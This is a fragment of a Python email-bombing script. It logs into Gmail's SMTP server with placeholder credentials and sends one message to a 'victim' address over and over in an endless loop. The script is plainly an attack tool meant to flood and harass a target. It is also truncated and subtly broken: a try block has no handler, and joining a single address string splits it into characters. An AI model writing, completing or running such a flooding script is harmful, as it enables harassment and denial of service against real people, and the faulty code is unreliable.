import smtplib
gmail_user = "ave de kaya input"
gmail_password = "input"
sent_from = gmail_user
victim = "input"
to = victim
head = "input"
sp = "input"

def attack():
	try:
		email_text = """\
		From: %s
		To: %s
		Subject: %s
		
		%s
		""" % (sent_from, ", ".join(to), head, sp)
		
		
		while True:
			server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
			server.ehlo()
			server.login(gmail_user, gmail_password)
			server.sendmail(sent_from, to, email_text)
			print("[+]email sent!")
			
			
